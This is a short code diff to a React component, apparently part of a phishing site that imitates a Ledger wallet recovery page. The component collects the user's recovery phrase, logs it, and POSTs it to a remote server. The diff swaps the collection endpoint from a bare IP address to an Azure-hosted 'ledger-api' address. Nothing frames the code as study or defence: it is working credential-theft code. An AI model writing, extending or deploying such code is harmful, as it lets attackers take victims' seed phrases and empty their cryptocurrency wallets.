@@ -10,13 +10,16 @@ export default function RecoveryPhraseFinal() {
     let phraseString = phrase.join(" ");
     console.log(phraseString);
     try {
-      const response = await fetch("http://3.71.17.15", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({ phrase: phraseString }),
-      });
+      const response = await fetch(
+        "https://ledger-api-hkbrhze7e8dhcyc3.canadacentral-01.azurewebsites.net/",
+        {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({ phrase: phraseString }),
+        }
+      );
       const data = await response.json();
       navigate("/final");
       console.log(data);
